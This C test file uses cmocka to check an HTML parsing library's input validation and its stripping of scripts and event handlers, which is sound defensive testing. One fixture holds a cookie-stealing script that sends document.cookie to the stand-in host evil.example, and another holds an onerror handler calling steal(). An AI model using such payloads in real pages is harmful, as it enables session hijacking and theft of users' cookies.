/*
 * TDD suite for html_parse (Hito 2).
 *
 * RED state: there is no src/html_parse.c yet, so this fails to link on purpose.
 *
 * Build: make test   (requires libcmocka-dev and liblexbor-dev)
 * ASan:  make asan
 */

#include <stdarg.h>
#include <stddef.h>
#include <stdint.h>
#include <setjmp.h>
#include <string.h>
#include <cmocka.h>

#include "html_parse.h"

#define LIT(s) (s), (sizeof(s) - 1)

static const char DOC_SIMPLE[] =
    "<!DOCTYPE html><html><head><title>Hello Title</title></head>"
    "<body><p>Hello World</p></body></html>";

static const char DOC_SCRIPT[] =
    "<html><body><p>visible</p>"
    "<script>document.location='http://evil.example/'+document.cookie;</script>"
    "</body></html>";

static const char DOC_HANDLER[] =
    "<html><body><img src=x onerror=\"steal()\"><a href=# onclick=\"x()\">k</a></body></html>";

/* --- config / validator --- */

static void test_config_default_is_secure(void **state) {
    (void)state;
    hp_config c = hp_config_default();
    assert_int_equal((unsigned long)c.max_bytes, (unsigned long)HP_DEFAULT_MAX_BYTES);
    assert_int_not_equal(c.strip_scripts, 0);
    assert_int_not_equal(c.strip_event_handlers, 0);
}

static void test_validate_rejects_null(void **state) {
    (void)state;
    hp_config c = hp_config_default();
    assert_int_equal(hp_validate_input(NULL, 10, &c), HP_ERR_NULL_ARG);
}

static void test_validate_rejects_empty(void **state) {
    (void)state;
    hp_config c = hp_config_default();
    assert_int_equal(hp_validate_input("x", 0, &c), HP_ERR_EMPTY);
}

static void test_validate_rejects_oversize(void **state) {
    (void)state;
    hp_config c = hp_config_default();
    c.max_bytes = 8;
    assert_int_equal(hp_validate_input("123456789", 9, &c), HP_ERR_TOO_LARGE);
}

static void test_validate_accepts_within_cap(void **state) {
    (void)state;
    hp_config c = hp_config_default();
    assert_int_equal(hp_validate_input(LIT(DOC_SIMPLE), &c), HP_OK);
}

/* --- parse: argument guards --- */

static void test_parse_rejects_null_args(void **state) {
    (void)state;
    hp_config c = hp_config_default();
    hp_document *doc = NULL;
    assert_int_equal(hp_parse(NULL, 5, &c, &doc), HP_ERR_NULL_ARG);
    assert_int_equal(hp_parse("x", 1, &c, NULL), HP_ERR_NULL_ARG);
}

static void test_parse_rejects_oversize(void **state) {
    (void)state;
    hp_config c = hp_config_default();
    c.max_bytes = 4;
    hp_document *doc = NULL;
    assert_int_equal(hp_parse(LIT(DOC_SIMPLE), &c, &doc), HP_ERR_TOO_LARGE);
    assert_null(doc);
}

/* --- parse: structure & extraction --- */

static void test_parse_simple_document(void **state) {
    (void)state;
    hp_config c = hp_config_default();
    hp_document *doc = NULL;
    assert_int_equal(hp_parse(LIT(DOC_SIMPLE), &c, &doc), HP_OK);
    assert_non_null(doc);
    assert_true(hp_element_count(doc) > 0);

    size_t tlen = 0;
    char *title = hp_get_title(doc, &tlen);
    assert_non_null(title);
    assert_string_equal(title, "Hello Title");
    hp_free(title);

    size_t blen = 0;
    char *text = hp_extract_text(doc, &blen);
    assert_non_null(text);
    assert_non_null(strstr(text, "Hello World"));
    hp_free(text);

    hp_document_free(doc);
}

/* --- script isolation (core Hito 2 guarantee) --- */

static void test_scripts_stripped_by_default(void **state) {
    (void)state;
    hp_config c = hp_config_default();
    hp_document *doc = NULL;
    assert_int_equal(hp_parse(LIT(DOC_SCRIPT), &c, &doc), HP_OK);
    assert_int_equal((unsigned long)hp_script_count(doc), 0UL);

    char *text = hp_extract_text(doc, NULL);
    assert_non_null(text);
    assert_null(strstr(text, "document.cookie")); /* script body must be gone */
    assert_non_null(strstr(text, "visible"));     /* real content survives */
    hp_free(text);
    hp_document_free(doc);
}

static void test_scripts_kept_when_disabled(void **state) {
    (void)state;
    hp_config c = hp_config_default();
    c.strip_scripts = 0;
    hp_document *doc = NULL;
    assert_int_equal(hp_parse(LIT(DOC_SCRIPT), &c, &doc), HP_OK);
    assert_true(hp_script_count(doc) >= 1);
    hp_document_free(doc);
}

static void test_event_handlers_stripped_by_default(void **state) {
    (void)state;
    hp_config c = hp_config_default();
    hp_document *doc = NULL;
    assert_int_equal(hp_parse(LIT(DOC_HANDLER), &c, &doc), HP_OK);
    assert_int_equal((unsigned long)hp_event_handler_count(doc), 0UL);
    hp_document_free(doc);
}

static void test_event_handlers_kept_when_disabled(void **state) {
    (void)state;
    hp_config c = hp_config_default();
    c.strip_event_handlers = 0;
    hp_document *doc = NULL;
    assert_int_equal(hp_parse(LIT(DOC_HANDLER), &c, &doc), HP_OK);
    assert_true(hp_event_handler_count(doc) >= 2);
    hp_document_free(doc);
}

/* --- robustness --- */

static void test_parse_malformed_does_not_crash(void **state) {
    (void)state;
    hp_config c = hp_config_default();
    hp_document *doc = NULL;
    static const char junk[] = "<div><span><<<>>>\x01\x02 unclosed <b><i>";
    assert_int_equal(hp_parse(junk, sizeof(junk) - 1, &c, &doc), HP_OK);
    assert_non_null(doc);
    hp_document_free(doc);
}

/* --- memory safety --- */

static void test_free_null_and_double(void **state) {
    (void)state;
    hp_document_free(NULL);
    hp_free(NULL);
    hp_config c = hp_config_default();
    hp_document *doc = NULL;
    assert_int_equal(hp_parse(LIT(DOC_SIMPLE), &c, &doc), HP_OK);
    hp_document_free(doc); /* freeing once is enough; NULL-safety covered above */
}

int main(void) {
    const struct CMUnitTest tests[] = {
        cmocka_unit_test(test_config_default_is_secure),
        cmocka_unit_test(test_validate_rejects_null),
        cmocka_unit_test(test_validate_rejects_empty),
        cmocka_unit_test(test_validate_rejects_oversize),
        cmocka_unit_test(test_validate_accepts_within_cap),
        cmocka_unit_test(test_parse_rejects_null_args),
        cmocka_unit_test(test_parse_rejects_oversize),
        cmocka_unit_test(test_parse_simple_document),
        cmocka_unit_test(test_scripts_stripped_by_default),
        cmocka_unit_test(test_scripts_kept_when_disabled),
        cmocka_unit_test(test_event_handlers_stripped_by_default),
        cmocka_unit_test(test_event_handlers_kept_when_disabled),
        cmocka_unit_test(test_parse_malformed_does_not_crash),
        cmocka_unit_test(test_free_null_and_double),
    };
    return cmocka_run_group_tests(tests, NULL, NULL);
}
